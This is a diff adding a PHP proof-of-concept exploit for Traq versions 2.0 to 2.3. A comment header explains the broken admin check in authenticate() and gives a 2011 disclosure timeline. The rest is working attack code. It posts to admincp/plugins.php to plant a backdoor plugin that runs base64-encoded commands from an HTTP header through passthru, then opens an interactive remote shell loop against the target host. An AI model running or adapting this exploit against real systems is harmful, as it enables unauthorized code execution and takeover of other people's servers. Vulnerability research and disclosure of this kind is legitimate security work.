@@ -1,0 +1,96 @@
+<?php
+
+/*
+    -----------------------------------------------------------------
+    Traq <= 2.3 Authentication Bypass / Remote Code Execution Exploit
+    -----------------------------------------------------------------
+    
+    author...............: Egidio Romano aka EgiX
+    mail.................: n0b0d13s[at]gmail[dot]com
+    software link........: http://traqproject.org/
+    affected versions....: from 2.0 to 2.3
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] vulnerable code in authenticate() function defined into /admincp/common.php
+    
+    27.    function authenticate()
+    28.    {
+    29.        global $user;
+    30.        
+    31.        if(!$user->group['is_admin'])
+    32.            header("Location: login.php");
+    33.    }
+    
+    This function is  called in each script  located  into /admicp/ directory to  make sure  the user
+    has admin rights,  but this is a broken authorization schema due to the header() function doesn't
+    stop the execution flow. This can be exploited by malicious users to execute admin functionality,
+    resulting for  e.g.  in execution of arbitrary PHP code  leveraging of plugins.php functionality.
+    
+    [-] Disclosure timeline:
+    
+    [25/11/2011] - Vulnerability discovered
+    [26/11/2011] - Vendor notified via email
+    [28/11/2011] - Issue reported to http://traqproject.org/forum/
+    [02/12/2011] - Vendor notified again via email
+    [02/12/2011] - Vendor fix released with version 2.3.1
+    [07/12/2011] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+ 
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+---------------------------------------------------+";
+print "\n| Traq <= 2.3 Remote Code Execution Exploit by EgiX |";
+print "\n+---------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /traq/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$phpcode = "error_reporting(0);print(___);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;";
+$payload = "plugin_id=1&title=1&execorder=0&hook=template_footer&code={$phpcode}";
+
+$packet  = "POST {$path}admincp/plugins.php?newhook HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+if (!preg_match("/php\?created/", http_send($host, $packet))) die("\n[-] Plugin creation failed!\n");
+
+$packet  = "GET {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+    print "\ntraq-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match("/___(.*)/s", $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
